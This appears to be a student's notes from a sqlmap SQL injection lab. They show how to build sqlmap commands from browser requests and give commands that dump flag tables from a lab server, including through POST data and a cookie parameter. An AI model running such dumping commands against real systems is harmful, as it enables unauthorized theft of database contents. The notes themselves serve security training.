
### Copy as cURL

>[!info] Copy as cURL
> Utilized within the Network tab within Chrome or FireFox. Right click -> Copy -> Copy as cURL:
> ```go 
> sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
> ```

##### GET/POST Requests
```go
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

# Questions

##### Question 1: What's the contents of table flag2? (Case #2)
```go
sqlmap -u "http://154.57.164.71:30211/case2.php" --dump --batch --data 'id=1'
```

##### Question 2: What's the contents of table flag3? (Case #3)
```go
sqlmap -u "http://154.57.164.71:30211/case3.php" -H 'Cookie: id=*' --dump --batch
```

#####  Question 3: What's the contents of table flag4? (Case #4)
```go
sqlmap -r case4.txt --dump --batch
```